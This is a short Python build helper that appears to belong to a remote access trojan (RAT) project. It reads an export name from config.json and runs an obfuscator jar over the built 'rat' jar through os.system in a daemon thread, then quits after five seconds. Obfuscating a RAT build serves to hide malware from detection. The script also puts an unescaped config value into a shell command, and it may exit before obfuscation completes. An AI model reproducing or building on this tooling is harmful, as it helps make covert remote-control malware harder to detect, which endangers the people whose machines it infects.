import os
import time
import threading
import sys
import json

data = open("config.json")
config = json.load(data)
exportname = config["config"]["exportname"]
cwd = os.getcwd()


def obfuscate():
    jar_path = f"{cwd}/rat/build/libs/{exportname}.jar"
    obf_path = f"{cwd}/obf/obf.jar"
    cmd = f'java -jar "{obf_path}" "{jar_path}"'
    os.system(f"{cmd}")

def obftimeout():
    time.sleep(5)


thread = threading.Thread(target=obfuscate)
thread.daemon = True
thread.start()
obftimeout()
quit()
